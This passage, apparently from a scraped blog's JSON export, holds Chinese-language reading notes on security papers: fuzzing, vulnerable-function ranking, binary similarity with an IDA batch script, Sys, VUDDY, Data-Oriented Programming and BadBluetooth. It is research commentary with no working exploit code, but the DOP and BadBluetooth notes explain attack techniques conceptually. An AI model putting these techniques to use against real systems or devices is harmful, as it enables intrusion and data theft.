Overview#不得不说汇总的真详细，直接po图了，各个研究的时间线，黑白灰，以及侧重方向一览无余以及一个整理好的表PreProcess#Instrumentation#通过插桩来获取在fuzz过程中的有用信息，可以是静态的插桩，也可以是动态的插桩静态插桩需要的开销要小，但是需要找同版本的依赖库编译，除了源代码级别的静态插桩，也有二进制级别的静态插桩动态插桩需要的开销要大，不过好处是更容易检测动态链接库，工具有：DynInst , DynamoRIO , Pin , Valgrind, and QEMU.有的fuzzer可以静态插桩也可以动态插桩Execution Feedback：路径覆盖：AFL及其衍生、CollAFL结点覆盖：LibFuzzer、Syzkaller可选：HonggfuzzIn-Memory Fuzzing：对于一些应用，例如有GUI的程序，初始化绘制GUI什么会浪费时间，这个时候可以dump下初始化后的内存空间来节约时间。有的fuzzer在内存中对一个函数反复fuzzing，称为API fuzzing。缺点：1.不好重建bug产生时的上下文进行复现。2.对于跨函数调用的fuzz可能会出问题。Thread Scheduling：条件竞争很难触发，因为它们依赖于不确定的行为，这种行为可能很少发生。但是，通过显式地控制线程的调度方式，插桩也可以用来触发不同的非确定性程序行为已有的研究表明，即使随机调度线程也可以有效地发现竞争条件错误。Seed Selection#有的情况下fuzzing的取值域会很广，例如MP3文件等。因此如何选择最小的初始化种子集合称为种子选择问题，目的是：找到最小的初始种子集合，使得在fuzzing过程中覆盖率最大化。也就是使得fuzzing的效率更高。例如我们有种子s1，它能覆盖到{10,20}，以及s2-&gt;{20,30}，那么如果这个时候种子s3-&gt;{10,20,30}，则显然以s3作为初始种子更加高效。Seed Trimming#较小的种子集合可能会消耗较少的内存并引发更高的吞吐量，所以一些fuzzers在fuzz之前减小种子集合的大小，这便是种子集合的修剪。一般发生在PREPROCESS或者CONFUPDATE之中Preparing a Driver Application#对于一些没法直接fuzzing的情况，可能需要自己写一个driver程序。SCHEDULING#调度是只选择一个fuzz configuration，然后进入下一轮的fuzz。对于简单的fuzzer，例如zzuf，则没有这个步骤。已有的研究中，ADLFast，BFF等的亮点就在于他们使用的调度策略。本节只讨论黑盒和灰盒 fuzzing中的调度策略。The Fuzz Configuration Scheduling (FCS) Problem#调度的目标：分析当前configure信息找到可能有最好结果的输入：bugs最多或者覆盖面最大…还有一些算法1中的解释，很明白Black-box FCS Algorithms#对于黑盒fuzzing来说，能够用于FCS的只有：已有的crashes和bugs信息+执行时间举例HouseHolder、Foote提出成功率指标：#bugs / #runsMAB 算法：faster to fuzz allows a fuzzer to either collect more unique bugs with it, or decrease the upperbound on its future success probability more rapidly.Grey-box FCS Algorithms#灰盒fuzzing能获取的信息比黑盒更多，例如覆盖率等信息AFL提出EA算法，EA算法维护了一系列的configuration，从中间选取fit的configurations用来生成待测用例疑问三连：what makes a configuration fit？how configurations are selectedhow a selected configu- ration is used.大部分fuzzers都会考虑控制流关系。AFL的策略是选取最快最小的输入，称为fit（favorite）的AFLfast优化了AFL，快7倍，发现了3个AFL没发现的bug选择路径频率最小的来探索稀有路径基于优先级来选择configuration，而不是循环选择使用power schedulAFLGo进一步优化了优先级策略INPUT GENERATION#有的fuzzer通过在原有seed上突变来产生下一次的输入，而有的基于model产生下一次的输入Model-based (Generation-based) Fuzzers#predefined model 预定义模型：1.在使用前由user定义模型；2. 模型由fuzzer通过预定义的语法等来自动构建Inferred Model 推断模型：发生在PREPROCESS和CONFUPDATE阶段，通过数据驱动、状态机等实现推断Encoder Model：常用于有固定格式的文件的fuzzerModel-Less （Mutation-based）Fuzzers#这个很常见比特位翻转算数变异基于块的变异基于字典的变异White-box Fuzzers#动态符号执行启发式fuzzing输入变异INPUT EVALUATION#是对输入进行执行以及分析的过程Bug Oracles#用于判断是否有crash 或者有bug的policy，分类举例如下Memory and Type Safety：Address Sanitizer、SoftBounf/CETS、CFIUndefined Behaviors：Memory Sanitizer 、Undefined Behavior Sanitizer、Thread SanitizerInput Validation：KameleonFuzz、μ4SQLiSemantic Difference：black-box differential fuzzExecution Optimizations#由于需要频繁运行程序，所以需要进行执行优化。例如函数级别的fuzz、通过fork已有的进程来免去加载时间等等Triage#分类是分析和报告导致违反策略的测试用例的过程。分类可以分为三个步骤：重复数据消除、优先级划分和测试用例最小化。重复数据消除方法：Stack Backtrace Hashing、Coverage-based Deduplication、Semantics-aware DeduplicationPrioritization and Exploitability：著名的有WinDbg的自动检测能够被利用!expoitableTest case minimization：例如BFF、AFL等fuzzer使用的策略CONFIGURATION UPDATING#黑盒、白盒、灰盒fuzzing在这一个步骤上区别很大Evolutionary Algorithm：维护seed pool，使其尽可能到达更多的路径Maintaining a Minset：最小化测试用例集合，最大化覆盖率个人感觉#整体上写了很多，并且分类也十分细致，抽取出了一个fuzzer的框架，但东西太多，点到为止。看完其他的fuzzing paper再回来看这篇论文收获会更大。","link":"/92a4b7cb.html"},{"title":"LEOPARD: Identifying Vulnerable Code for Vulnerability Assessment through Program Metrics(ICSE 2019)","text":"识别代码中的脆弱点漏洞评估的重要步骤，当前主要的两种方法为：基于度量和基于模式。前者基于机器学习，后者依赖先验知识。本文提出并实现了一个通用、轻量且具有可扩展性的基于程序指标识别漏洞函数的框架 LEOPARD，这个框架不需要任何漏洞的先验知识就能识别脆弱点。第一步，通过复杂的程序指标将目标应用的函数分类；第二步，对每个分类中的函数进行排序，并将排位靠前的函数作为漏洞函数。在实际应用中，LEOPARD将20%的函数中识别出了74%的漏洞函数，从PHP，r2等应用中找到了22个新bug，其中8个是新漏洞。Introduction#两种方法：Metric-based:使用监督学习或无监督学习，在文件粒度级别预测漏洞缺点：复杂度过高，需要采用复杂的特征，例如词频，依赖关系等Pattern-based：Pattern来自于语法或语义抽象，基于先验知识检测特定类型的漏洞，例如missing check等存在的问题:都基于先验知识，复杂度太高等LEOPARD：用于漏洞评估，而不是指出漏洞在哪里（？？？我感觉挺扯淡的这个东西）不需要先验知识，使用complexity metrics和vulnerability metricscomplexity metrics：关注函数复杂性（循环复杂性和循环结构）vulnerability metrics：关注函数依赖、指针使用，控制结构的依赖关系分为两步：第一步：使用complexity metrics将函数分为多类第二步：使用vulnerability metrics对每一类中的函数进行排序，靠前者为可能的漏洞函数Methodolody#整体框架如下图：Function Binning#不同的漏洞通常具有不同的复杂程度。为了识别各种复杂程度的漏洞，首先将目标应用程序中的所有函数基于复杂度分为多个种类。每个种类代表不同的复杂程度，供后面的Function Ranking来做预测。这种分级和排序方法旨在避免遗漏低复杂性的易受攻击的功能。两类特征：CD1：主要考虑函数中的路径数目CD2：主要考虑循环结构的特征，包括循环数、嵌套循环数和循环的最大嵌套级别。Function Ranking#根据漏洞的一般特征推导出一组新的漏洞度量，然后对每类中的函数基于度量进行排序，将最上层函数识别为易受攻击的函数。主要选用选用了三类特征：依赖度量：包括函数参数已经caller和callee之间的依赖指针度量：指针算数运算的数量、指针运算中涉及到的变量数目等控制流结构度量：最大控制流依赖等Applications of LEOPARD#由于之前说过LEOPARD不是直接检测漏洞，只是用来预测哪部分很可能出现漏洞，因此这里讲的是对LEPPARD的应用。主要是拿LEOPARD的结果去fuzzing，然后发现了22个bug，其中8个是漏洞。Evalutaion#主要针对以下五个问题进行评估Q1. Is the binning step before the ranking step reasonable?Q2. Is our binning-and-ranking approach effective, and can it outperform baseline approaches, machine learning-based techniques and some off-the-shelf static scanners?Q3. What is the sensitivity of the metrics to the effectiveness of our framework?Q4. What is the performance overhead (i.e., scalability) of our framework?Q5. What are the potential application scenarios of LEOP- ARD?Q1：通过在现有的ground truth中使用度量计算分数，可以看到其中确实存在着关系Q2：通过和现有的方法对比，主要评估相同百分比的源代码中找到的漏洞占比Q3: 通过在原来的度量上去掉某度量和不去掉时的效果进行比较，结论为，去掉后的效果都不如去掉前，每个度量比较敏感，所以总体度量的选择是比较合适的Q4：经过在大项目中的评测，可以适用于大规模处理Q5：主要应用前景还是在进一步的fuzz中，LEOPARD的结果对灰盒fuzz帮助较大个人感觉#总体来说，启发式的方法对于分析人员还是很有好处的，分析人员能重点关注启发式的结果，在同样的投入下得到更高的审计产出。之前关注的都是直接找漏洞的研究，但确实都需要先验的知识，例如基于0day的patch找1day等。文中方法虽然也是有先验的信息，但不需要大量的数据收集和训练等步骤，可以说是一种通用的启发式方法。整体感觉上，是阐述了 越复杂的函数越容易出漏洞的 简明道理。","link":"/eda43453.html"},{"title":"Order Matters: Semantic-Aware Neural Networks for Binary Code Similarity Detection(AAAI 2020)","text":"​ 二进制代码相似性检测：在没有源代码的情况下检测相似的二进制函数。传统的方法一般使用图匹配算法进行检测，但传统方法准确率低且复杂度高。深度学习的发展为这一领域提供的新的方法，根据控制流图生成CFG，并使用GNN计算图嵌入，既高效又准确。本文提出Semantic-Aware Neural Networks ，取得了不错的成果Introduction#​ 2017年有学者提出了Gemini网络（Gemini不是QG前主教练吗hhhh）​ Gemini首先将CFG使用人工定义的特征，将CFG中的块表示为低维特征。然后使用Structure2vec生成图前嵌入。最后使用siamese计算两个二进制函数的相似度得分并使用梯度下降训练模型。​ 但Gemini也有一些不足之处：1.它表示使用的向量只有8维，因此会损失很多语义信息；2.节点的顺序是很重要的一个信息，但它没有考虑。​ 为了解决上面两个问题：本文使用了包含以下三个组件的框架：semantic-aware模块、structural-aware模块、order-aware模块。​ 在semantic-aware模块中，使用NLP的方法对二进制函数的语义进行提取，将token看成word，block看成sentense。文中使用bert进行训练​ 在structural-aware模块中，使用MPNN计算CFG的图信息​ 在order-aware模块，主要是提取节点的顺序信息。如下图，是在不同平台编译的同一函数的CFG，可以看到它们的Node1都与Node2和Node3连接。Node2都与Node4和Node5连接。这个相似性可以从它们的邻接矩阵中很容易看到。贡献：提出了能进行二进制相似性识别的框架在semantic-aware模型中使用Bert进行预训练，并分割成MLM、ANP、BIG和GC四个子任务在order-aware模型中，使用CNN检测邻接矩阵的相似性related work#Xu等人 Gemini 2017：使用图嵌入，效果好于传统方法，但手动选择特征进行块表示，包含的语义信息不足够Zuo等人 2018：使用LSTM，将token看成word，block看成句子，使用LSTM进行语义表示，确保相同的块，语义表示也相同。缺点：1.训练数据太依赖专家经验；2.不同的平台需要进行单独训练和数据的收集Model#总览： 可以看到上下两条路径。上面的路径输入时去掉了CFG的流信息，只使用块作为输入，在Semantic-aware模块中获得block embedding，然后通过Structual-aware模块获得graph embedding和structual embedding。在下面的路径中使用CFG的邻接矩阵作为输入，得到图的顺序信息，最后使用concat+MLP获得函数的表达。 $$G_{final} = MLP([G_{ss},G_o])$$其中$G_{ss}$是上面得到的图嵌入信息，$G_o$是下面得到的图嵌入信息。Semantic-aware 模块#​ 在Bert预训练模型中，主要完成四个任务，这有很多好处：1.可以从不同架构、不同平台、不同优化选项下的CFG中得到block embedding；2.在预训练过程中，我们可以得到token、block、graph粒度下的信息（因为有token level、block level和两个graph level任务）；3.不需要需改编译器等来获得相似的块。​ ​ 从上图可以看到Bert预训练时要完成的4个任务。MLM是一个token-level的任务，对block中的token进行mask操作并进行预测ANP任务是一个block-level的任务，控制流图是一个有向图，有节点的拓扑顺序，将控制流图中的所有相邻节点提取出来，当作相邻的“句子”。这些相邻的block pair作为ANP任务的正例，并随机选择同图内不相邻的block pair作为负例。BIG是一个graph-level的任务，目的是让模型判断两个block是否在同一个图中。GC是一个graph-level的block分类任务，在不同平台、不同编译器、不同优化选项的条件下，得到的block信息有所不同，因此希望模型可以让block embedding中包含这种信息。GC对block进行分类，判断block属于哪个平台，哪个编译器，以及哪个优化选项。Structural-aware 模块#​ 在有了Bert的结果后，在这一模块中使用MPNN计算graph semantic和 structural embedding。MPNN包含三个步骤：message function M、update function U 、readout function R，经过T次后获得最终的graph embedding和structual embedding。$$m_{v}^{t+1}=\\sum_{w \\in N(v)} M_{t}\\left(h_{v}^{t}, h_{w}^{t}, e_{v w}\\right)$$$$h_{v}^{t+1}=U_{t} (h_{v}^{t}, m_{v}^{t+1} )$$$$g_{s s}=R\\left(h_{v}^{T} \\mid v \\in G\\right)$$​ 其中$G$指整个图、$v$代表节点、$N(v)$代表邻接节点、$h_v^t$代表$t$时刻的block embedding。在文中，$M_t$使用$MLP$、$U_t$使用$GRU$、$R$使用$MLP$。Order-aware 模块#​ 在这一模块中使用CNN模型，主要是为了学习到CFG中的平移不变性（借鉴计算机视觉领域）​ 在模型训练中，使用11层的Resnet结构，包含3个residual block，所有的feature map大小均为3*3。之后用一个global max pooling层，得到graph order embedding。在此之前不用pooling层，因为输入的图的大小不同$$g_o = MaxPooling(ResNet(A))$$Evalutaion#实验主要检验方法的跨平台能力和跨优化选项能力。Task1：跨平台二进制代码相似度分析Task2：判断优化选项的能力采用CNN确实能够学到控制流图中的节点顺序信息Binaryai工具测试#​ 科恩实验室在github以IDA 插件的形式开源了上面的工作。具体安装参考手册即可，注意需要$IDA \\geq 7.3$。由于需要批量化测试效果，所以简单实现了批量测试的脚本如下123456789101112131415161718192021222324252627282930313233343536373839404142434445import syssys.path.append('/usr/local/lib/python3.7/site-packages')import binaryai as baiimport idaapiimport idautilsimport pickledef match_func(mgr, ea, topk, funcset_ids): targets = None pfn = idaapi.get_func(ea) if idaapi.FlowChart(pfn).size &lt; mgr.cfg['minsize']: return None targets = None try: targets = mgr.retrieve_function(ea, topk=topk, funcset_ids=funcset_ids) return targets except: return Nonedef match_all_funcs(funcs): result = {} mgr = bai.ida_binaryai.BinaryAIManager() mgr.cfg = mgr.Default mgr.cfg['token'] = # 填写自己申请的API token funcset_ids = [mgr.funcset] if not mgr.cfg['usepublic'] else None for ea in funcs: targets = match_func(mgr, ea, 1, funcset_ids) if(targets == None): continue target = targets[0] result[ea] = target['function']['name'] return resultif __name__ == \"__main__\": idaapi.auto_wait() funcs = [] for func in idautils.Functions(): funcs.append(func) print(funcs) result = match_all_funcs(funcs) with open('binary_match.pickle','wb') as f: pickle.dump(result,f) idaapi.qexit(1)​ 测试结果是在这之前使用过的工具中结果最好的，具体表现在检出的数目最多，并且也保证了准确率，当设置阈值为默认0.9，选取top1结果时，测试的结果如下：zlib 1.2.11 stripped编译器优化选项TrueWrong结果数目/函数总数GccO011210122/218GccO19713110/202GccO29413107/196GccO3782098/185ClangO09035125/216ClangO110514119/208ClangO27527102/177ClangO37229103/174libpng 1.0.69 stripped编译器优化选项TrueWrong结果数目/函数总数GccO022464288/570GccO121075285/568GccO220974283/572GccO320381284/572ClangO019885283/568ClangO119585280/568ClangO2170112282/541ClangO3170113283/540​ 但工具也存在不足之处，尤其是对于小函数，由于缺乏足够的CFG信息，因此会出现一些误报，这应该也是插件代码中过滤了块数目不足3的函数的原因(idaapi.FlowChart(pfn).size &lt; mgr.cfg['minsize']) 。参考资料#https://link.zhihu.com/?target=https%3A//keenlab.tencent.com/en/whitepapers/Ordermatters.pdfhttps://github.com/binaryai/sdkhttps://zhuanlan.zhihu.com/p/96547586","link":"/99505d2e.html"},{"title":"Sys: a Static&#x2F;Symbolic Tool for Finding Good Bugs in Good (Browser) Code(USENIX 2020)","text":"作者设计了一个可扩展的漏洞发现工具(Sys)，并且在已经被好多自动化工具检查过的软件中发现了一些漏洞，比如说Chrome，Firefox，以及sqlite3。整个系统分为两个部分：首先通过静态分析定位可能存在漏洞的地方，然后在对这些备选项通过符号执行的方法进一步确认。这样就在漏洞发现的速度 和 准确率上得到了一个平衡。Introduction#研究原因：现在的大厂对产品安全问题都十分重视,Chrome、Firefox、Sqlite都是经过好多Fuzzer的检测才发布，所以想要在这些产品里找bug是难上加难，之前实验室里发布的符号执行工具KLEE已经不能解决这个问题了。众所周知，静态分析：速度快但不准确，动态符号执行：速度慢准确。所以两者结合就在速度和准确度上做了一个平衡，这也是Sys的想法。第一步：静态分析pass确定可能的error点。并且用户可以写自己的静态分析规则来定位potential error第二步：对第一步的结果进行符号执行确认，去除误报。用户也可以写自己的符号习性checker。Sys的符号执行并不是执行所有的片段，而是执行一部分代码，因为大部分的bug都是存在于一小部分上下文中的，比如说找无限循环，只要看for循环就可以了，这样也减少了符号执行的资源开销。以上就是Sys在三个软件中找到的bugs总结。因为在现实中的软件都是不一样且有高度交互的，所以在设计系统的时候为了用户定制，也实现了一套语言(DSL)，用户使用DSL语言在上层写自己的checker，然后剩下的转换都交给Sys完成。贡献点：Sys系统和自带的5个checker一种大规模软件符号执行的方法DSL语言，方便用户自定义System Overview#拿一个Sqlite的例子来说，用户只需要提供一个checker和一个LLVM的IR文件给Sys，就可以得到最终的bug报告。感觉还是很易用的呢，不过看了他论文实验的机器配置，虽然开源了代码，但让人丝毫没有想用的兴趣Sys发现bug三部曲：静态扫描动态符号执行确认总结报告Static#静态扫描部分是允许用户扩展的，也就是上图里的extenson。这一步和其他的静态审计工具差不多，先使用LLVM生成中间IR文件，然后解析CFG，根据用Haskell语言写的extension检测bug。但也和其他的静态工具有一点不同，之前的静态工具为了低误报都检查的比较细，但Sys不需要,因为它的误报低有动态符号执行来保证,所以在这一步可以选择检测出较多的可能bug,然后交给符号执行。下面是一个Static 扩展的例子，用来找内存越界的问题Symbolic#自动符号执行完整路径使用用户定义的checker判断是否为漏洞Sys的符号执行在内存拷贝的基础上进行，在IR上建立约束关系和逻辑表达式，然后加入用户的checker，最后使用SMT求解器求解关系是否可达。下面是一个Symbolic checker的例子同时Sys在执行的时候也会跳过无关的语句和函数（类似于函数切片的思想，去除无关语句的执行，提高效率）Unknown state#由于只执行部分上下文，所以中间一些相关变量的状态都是没法确定的，这也是Sys的一个不足之处。所以Sys在执行时需要自己去伪造这些状态，并且确保这些丢失的约束信息不会造成误报。在第一点上，Sys采用的是懒分配的方法，也就是用的时候再分配内存够。比如说当出现解引用的时候，就分一块内存给变量。但由于位置的状态，所以造成误报是可能存在的，但是Sys有可以确保这种情况尽量的少：Sys会探索所有可能的路径只要找部分上下文错误，而不是确保函数都正确checker提供的漏洞存在时满足的条件信息大量的误报必然存在根本原因，Sys可以通过ad hoc,checker的定义技巧解决这个问题SysDSL design#算是一种好的语言设计的原则吧：基于特定领域的，带有领域特性有足够表达能力的，就是尽量保证能做自己想做的所有事简单，比如python多类型且安全的Static extensiions#静态分析在LLVM的Bytecode上完成，理由如下：可以把静态pass和动态pass结合在一起在LLVM的IR上可以对任何语言进行扩展可以看到C++语言相对底层的东西可以考虑到编译的优化选项SysDSL#使用SysDSL设计好符号执行的checker以后，会自动的将对应的LLVM指令转换成SMT约束表达，包括算数表达，比较，类型转换等等。同时SysDSL也完成了对每一条LLVM指令的表达，这样可以让用户更好的实现checker的功能Memory Design#核心：将所有的对象什么使用的内存表示为连续的数组原因：现在的SMT求解器对数组的支持很好对于C++中的多级指针，用数组可以很方便的表示，比如***P用数组表示为mem[mem[mem[p]]]Sys也采用了Valdrind等工具一样的Shadow memory方法缺点：慢！内存读取越界问题（可通过一些方法解决）Using Sys to find bugs#通过实例索命Sys的两个优点：对漏洞的表达能力找新bug的效率我发现这个论文用了好大的篇幅来一遍一遍的吹，服了uninitialized memory#静态checker：一个变量分配了内存，但没有明显的写入动态checker：用shadow memory的看是不是真的没有对那块内存进行写入然后也是在Chrome、Firefox、FreeBSD里找到了一些变量未初始化漏洞Heap out-of-bounds#Concrete out-of-bounds#Unvalidated user data#The checker traces untrusted values copied from user space, using the solver to flag errors if (1) an untrusted value used as an array index can be enormous; or (2) an untrusted value passed as a size parameter (e.g., to memcpy) could cause overflow.Conclusion#总的来说：Sys结合了静态分析和动态符号执行的优点，在速度和准确率上做了一个平衡，并且比较好的是，由于只符号执行部分上下文，所以在大型软件上有很大的优势，并且设计的SysDSL语言和Sys系统更配哦。github官方出品的CodeQL工具，让我们可以静态的写checker查询，但没有符号执行，所以都得一个一个确认，如果能够自己在CodeQL的结果中写一套符号执行帮我们过滤到误报，感觉也是一个不错的选择","link":"/bc8e474f.html"},{"title":"VUDDY A Scalable Approach for Vulnerable Code Clone Discovery(S&amp;P 2017)","text":"Abstract#随着开源世界的扩大，代码克隆的情况也越来越普遍，与此同时，由于代码克隆产生的1day漏洞也越来越多，因此自动化的克隆代码漏洞检测成为一大需求。本文提出了一种大规模复用漏洞代码检测的方法——VUDDY，能在大规模的代码中精确有效的发现漏洞。优势：十亿行量级的代码检测只需要14小时17分钟可进行传统的完全检测和部分正规化后的检测规模和准确率完胜其余的相关研究有一定的检测0 day漏洞的能力Introduction#代码克隆缺点：raise maintenance costsreduce qualityproduce potential legal conflictspropagate software vulnerabilities…最大的问题在于由于代码克隆，一个已经给出的补丁，并不会马上被用于修复使用克隆代码的项目，给黑客的利用提供了可乘之机。其余研究的短板：CCFinder等：处理太复杂ReDeBug：目的是为了大规模、快和准确，但实际效果并不行SourcererCC：容易找到已修补的克隆代码VUDDY（VUlnerrable coDe clone DiscoverY）…（这名字取的真刻意）：函数粒度识别正则化使得其漏洞模式（也就是漏洞函数）存在一定通用性二级索引：长度+hash，使得其更快效果：1764个patch中找到5664个漏洞函数，从25253个C/C++项目中找到了133812个漏洞函数（1 day），比ReDeBug快2倍，having no false positive with Android firmware. Meanwhile, ReDeBug had 17.6 % false positives.本文贡献：工具VUDDY漏洞模式抽象自动化漏洞信息获取开放服务， https://iotcube.net/，我试用过，做的还是很不错的，但是要自己用VUDDY开源的代码处理。然后提交hash文件检测。Taxonomy and related work#Taxonomy#克隆代码分类：Type1：完全克隆，无修改Type2：重命名克隆，例如类型名，函数名，变量名等Type3：简单的增删等Type4：语义克隆其中VUDDY支持类型1和类型2的检测代码粒度分类：tokenlinefunctionfilerelated work#根据粒度来讲token-level：CCFinder（我用过不好用）、CP-Minerline-level：Redebug（好用）function-leve：SourcererCC（好用）file-level：DECKARD、FCFinderHybrid granularity：VulPeckerProblem and goal statement#Problem formulation#克隆检测定义：从一个代码项目中，判断函数是否存在完全克隆定义：$C(f)=1$抽象克隆定义：Goals#设计一个能检测1、2类克隆的算法The proprosed method：VUDDY#VUDDY的框架如下图所示：分为两个部分：预处理部分和克隆检测部分预处理部分：函数提取抽象和正规化漏洞指纹生成克隆检测部分：key查询hash查询Preprocess#Function retrieval：使用ANTLR实现了一个提取C程序中的函数的jar包，并提取参数、类型、局部变量信息Abstraction and normalization：对参数、类型、局部变量进行正规化，（统一用某个字符串代替），可以分为不抽象、参数抽象、局部变量抽象、数据类型抽象、函数调用抽象，见下图Fingerprint generation：计算函数体以长度和hash值，示例见下Clone detector#key lookup: 长度过滤hash lookup：hash比对由于用了两层索引，速度很快，最差是O(n)Application：Vulnerability detection#Establishing a vulnerability database#Git clonegit log --grep=‘CVE-20’Git show commitFilter irrelevant commits.git show the old file ID通过这种方法找到了9779个漏洞不行，对CVE去重后的1764个补丁中找到了5664个扣动函数Vulnerability detection#和clone detector没啥差别，但是是集合和集合间的交叉搜索Implememtation#ANTLR实现函数提取部分hash选用md5字典选用python的dict[Length]=[hash1,hash2..]Evalutaion#实验环境：Ubuntu16.042.40 GHz Intel Zeon32GB RAM6TB HDD*数据集： 从2016.1.1到20167.28 github上的 25253个C/C++ git项目比较的配置：大数据量比较：准确率比较：完全克隆检测和抽象比较: 166个 VS 206个，后者比前者多了24%的结果Compare with redebug#twice fasterless false positiveVUDDY可以检测第二类但是ReDeBug不行具体的分析就不说了Discussion#讨论了函数粒度的优势，包括时间复杂度、内存使用以及精度个人看法#与redebug相比，把粒度加大到函数，错误率与redebug相比会降低很多当redebug的窗口设置为函数体大小时，就等于不进行正规化的VUDDY从使用效果来看，其实还是有部分误报情况的，准确度和具体的项目有很大关系","link":"/21fd9cb8.html"},{"title":"Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks(S&amp;P 2016)","text":"根据控制流的攻击我们知道有ROP和JOP，分别利用包含ret和jmp的Gadgets进行攻击，劫持控制流。非控制数据攻击通过攻击程序内存，达到信息泄露或者权限提升等目的。文中提出了DOP攻击，利用程序中的Gadgets，构造任意x86程序的非控制数据攻击，并且这种攻击是图灵完备的。Introduction#控制流劫持攻击是目前主流的攻击，例如ROP及其变种，但对此人们也有很多防御措施：CFI、CCFI、CPI、TASR、ASLR、DEP等。从程序的执行角度，我们可以想到程序是存在控制流和数据流的，而以上只能保证控制流部分的安全，对于数据流则无无能为力，所以非控制数据流攻击就成了额外的攻击方法，只要修改内存中的几个字节，就能达成攻击目的。本文方法：找DOP的gadgets——模拟图灵运算找gadgets dispatcher——串联Gadgets实验结果：9个程序中找到了7518个gadget和5092个gadgets dispatcher其中8个程序能模拟任意计算，2个可以达成图灵完全攻击最后也实现了3种端到端的攻击，并且ASLR和DEP对攻击无作用。Problem#Background: Non-control Data Attacks#通过直接攻击数据流来达到攻击目的，例如下图中，我们只要修改变量pw-&gt;pw_uid的值，就能达到提权的目的Example of Data-oriented Programming#能看懂啊line 7 存在溢出，因此buf溢出能控制局部变量(tyoe,size,connect_limie)，同时局部变量又能修改指针（line12，line13）这种就称为data-oriented gadgets，同时可以注意到它们都在while循环中，因此可以连续的利用，称为gadget dispatchers通过对上图中的DOP利用，能够更新Code3链表中的函数，并且这种攻击时满足CFG完整性的Questions#DOP gadgets和gadgets dispatcher存在普遍吗？能否根据需要链式gadgets达到攻击，是否图灵完备？能否突破当期的防御机制？DATA-ORIENTED PROGRAMMING#DOP Overview#DOP主要是模拟表达式计算，因此定义了如下DOP语言包括六种虚拟指令，实现算术、逻辑、赋值、加载、存储、跳转、条件跳转等操作。Data-Oriented Gadgets#DOP的gadgets不能使用寄存器，使用内存来模拟寄存器。面向数据的gadgets模拟了三种micro-operation：加载，运算和写入。DOP和ROP很像，他们的区别主要在于以下两点：DOP的gadgets只能使用内存来传递操作的结果，而ROP的gadgets可以使用寄存器。DOP的gadgets必须符合控制流图（CFG），不能发生非法的控制流转移，而且无需一个接一个的执行。而ROP的gadgets必须成链，顺序执行。模拟算数运算：模拟赋值运算：模拟加载，存储运算：Gadgets Dispatcher#Dispatcher用来对gadgets进行迭代调度，在每一轮迭代中选用不同的gadgets对上一轮的结果进行处理，为了将第i次迭代的输出和第 i+1 次迭代的输入对应，gadgets将第 i+1 的加载地址设置为第 i 次迭代的存储地址。除了上述多轮的攻击，还存在一种非交互式的DOP攻击。这种攻击要求攻击者一次性将攻击载荷输入，为了支持这样的攻击，MINDOP中也保留了两个跳转指令，能实现跳转模拟跳转：关键是找到一个合适的变量，可以在每次循环迭代中修改的虚拟 PC 指针，如上述代码，有一个内存指针 pubf -&gt; current，指向了恶意网络输入的缓冲区。在每一次循环迭代中，代码从该缓冲区读取一行，然后在循环体中处理它，因此这个指针可以用来模拟虚拟 PC 指针。对于模拟非条件跳转，攻击者只需要配置好内存，来触发另一个操作 gadgets（如加法、赋值）来改变虚拟 PC 指针的值。DOP ATTACK CONSTRUCTION#这里总结一下在DOP过程中需要解决的三个问题：DOP gadgets识别DOP gadgets dispatcher识别DOP gadgets的拼接利用，在保证程序不崩溃的前提下进行攻击Gadget Identification#一个有用的DOP gadgets需要满足一下两个条件：满足MINDOP语义。包含加载、存储、运算指令在顺序上应该满足加载、运算、存储的顺序。使用LLVM实现对DOP gadgets的识别 (https://github.com/melynx/DOP-StaticAssist)：LLVM IR提供了比二进制更多的程序语义，同时避免了对程序源码的解析。它还允许对任何有LLVM前端的语言编写的源码进行语言诊断分析。gadgets分类：根据语义和运算的变量分为三类，并且在使用优先级上全局变量gadgets&gt;函数参数gadgets&gt;局部变量gadgets全局变量gadgets：操作全局变量函数参数gadgets：操作函数参数局部变量gadgets：操作局部变量Dispatcher Identification#同样也基于LLVM IR 实现（https://github.com/melynx/DOP-StaticAssist）Attack Contruction#前提：需要攻击者能够控制第一个gadget加载的地址或者第一个gadget存储的地址攻击步骤：Gadget preparation (Semi-automated).：根据一个程序错误，定位到漏洞函数，然后找函数中的gadget dispatcherExploit chain construction (Manual)：将预期的恶意 MinDOP 程序输入，每一个 MinDOP 操作由DOP gadgets 实现，并根据优先级选择合适的 gadgetsStitchability verification (Manual)：验证是否成功，如果不行回到上一步Evaluation#在Evalution中回答了三个问题：DOP gadgets和gadgets dispatcher存在普遍吗？能否根据需要链式gadgets达到攻击，是否图灵完备？能否突破当期的防御机制（ASLR/DEP）？Q1#在9个程序中找到了7518个gadgets和5052个gadgets dispatcher，因此是普遍存在的Q2&amp;Q3#通过对实际漏洞的攻击完成说明，见论文部分Discussion#DOP目前已经实现了对ASLR、DEP、TASR防御的突破，但也可能可以通过以下方法进行防御memory security：通过检测恶意内存损坏来防止出现内存错误。Data-Flow Integrity：类似于CFI在控制流完整性上的防御。Fine-grained Data-Plane Randomization：细粒度的数据面随机化可以缓解 DOP 攻击，因为 DOP 仍然需要获取某些非控制数据指针的地址。Hardware and Software Fault Isolation:内存隔离被广泛用于防止未经授权访问高权限资源，只有合法的代码区域才能访问特定的资源，这样可以防止一些直接的数据破坏攻击。总体来说，上述保护措施都会对程序执行带来极大的开销，只是能用来防御，但也需要考量效率问题。","link":"/c30e365e.html"},{"title":"BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals(NDSS 2019)","text":"本文针对Android 4.2后google开发的蓝牙栈 BlueDroid中存在的粗粒度权限管理问题，提出了并实现了在多版本中的攻击BadBluetooth。通过将蓝牙设备伪装为键盘，网络接入点和耳机，同时配合Android 恶意app发起静默配对，最终实现控制手机截屏偷取用户隐私数据，劫持通信流量，甚至在锁屏状态下拨打电话等攻击。最后，作者在AOSP项目上实现了对应的防御框架Introduction#本文从逻辑层面对蓝牙进行了系统的研究，包括攻击者模型、设备认证、授权、安全策略等底层假设。虽然各类OS都存在蓝牙模块，但考虑到Android系统的普及性，所以主要研究了Android系统蓝牙模块存在的问题。贡献：发现了几个Android系统在蓝牙设计和实现中的漏洞，包括设备配置文件修改，粗粒度的认证和授权机制等通过这些漏洞，能够在真实环境中实现攻击，造成信息泄露等威胁实现了针对这一问题的防御框架并进行了效果评估BackGround#背景介绍中主要介绍了蓝牙的相关知识，之前我也没接触过，所以认真看了下Bluetooth 